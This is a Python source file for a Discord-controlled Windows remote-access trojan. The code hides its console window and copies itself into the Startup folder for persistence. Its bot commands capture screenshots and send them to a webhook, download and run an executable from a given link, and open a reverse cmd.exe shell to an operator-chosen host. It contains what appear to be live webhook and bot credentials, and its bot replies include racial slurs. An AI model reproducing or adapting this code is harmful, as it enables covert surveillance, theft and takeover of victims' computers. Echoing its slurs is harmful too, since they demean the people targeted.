import socket
import subprocess
import getpass, discord, os, requests, pyautogui, subprocess
from discord.ext import commands as cmds
import ctypes
import win32process
import os
from shutil import copy2
from win32com.shell import shell, shellcon
from threading import Thread

class Shelly:
    def __init__(self, host:str, port:int):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        self.host = host
        self.port = port
        self.s = s

        Thread(target=self._start_conn).start()

    def _start_conn(self):
        p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = Thread(target = self.s2p, args = [self.s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = Thread(target = self.p2s, args = [self.s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try: p.wait()
        except KeyboardInterrupt: self.s.close()

    def s2p(self, s,  p):
        while True:
            try:
                data = s.recv(1024)
                if len(data) > 0:
                    p.stdin.write(data)
                    p.stdin.flush()
            except: pass

    def p2s(self, s,  p):
        try:
            while True:
                s.send(p.stdout.read(1))
        except: pass

def startup_directory():
    return shell.SHGetFolderPath(0, shellcon.CSIDL_COMMON_STARTUP, 0, 0)

in_startup = os.getcwd().lower() == startup_directory().lower()

def HideMyAss():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0: # HideMyAss™
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)

HideMyAss()

WEBHOOK_URL = "https://discord.com/api/webhooks/1061103306203742241/WTbemQScMu2fmB0El_86PdiQb52jLp96opyZPFE7xRpjzjnWKzIxQaV-mxzsOWc0cAv_"
TOKEN = "MTA2MTA5NjY4MTY5MDY0ODczNg.Gn3gFP.zgqpV0sZROtcyf7lt35v14GoYx87Y1b5ZvGTBs"
USERNAME = getpass.getuser()

client: object = cmds.Bot(command_prefix="!", case_insensitive=False, intents=discord.Intents.all())

def tohook(content:str):
    requests.post(
        url=WEBHOOK_URL,
        json={"content": content}
    )

@client.event
async def on_ready():
    requests.post(
        url=WEBHOOK_URL,
        # json={"content": f"@everyone Angel dua - {requests.get('https://geolocation-db.com/json').text}"}
        json={"content": f"@everyone Angel dua unmetered talha connection"}
    )

@client.command(pass_context=True)
async def ss(ctx):
    pyautogui.screenshot().save(f"{USERNAME}-ss.png")

    requests.post(
        url=WEBHOOK_URL,
        files={f"{USERNAME}-ss.png": open(f'{USERNAME}-ss.png', 'rb').read()}
    )

    os.system(f'del {USERNAME}-ss.png')

    await ctx.reply("i hate niggas")

@client.command(pass_context=True)
async def upload(ctx):
    await ctx.reply("[*] beginning the download...")

    _, link = ctx.message.content.split(' ')

    with open("Manager.exe", "wb") as f:
        f.write(requests.get(link).content)

    subprocess.run("Manager.exe")

    await ctx.reply("ran nigga code fuck :person_skintone4:")

@client.command(pass_context=True)
async def shelly(ctx):
    await ctx.reply("[*] starting the shelly :smiling_imp:")

    _, host, port = ctx.message.content.split(' ')

    Shelly(host, int(port))

    await ctx.reply('[++++++] sponsored by the shelly. :white_check_mark:')

def startup_directory():
    return shell.SHGetFolderPath(0, shellcon.CSIDL_COMMON_STARTUP, 0, 0)

in_startup = os.getcwd().lower() == startup_directory().lower()

if not in_startup:
    try:
        copy2(__file__, startup_directory())
    except:
        'couldnt copy :('

client.run(TOKEN)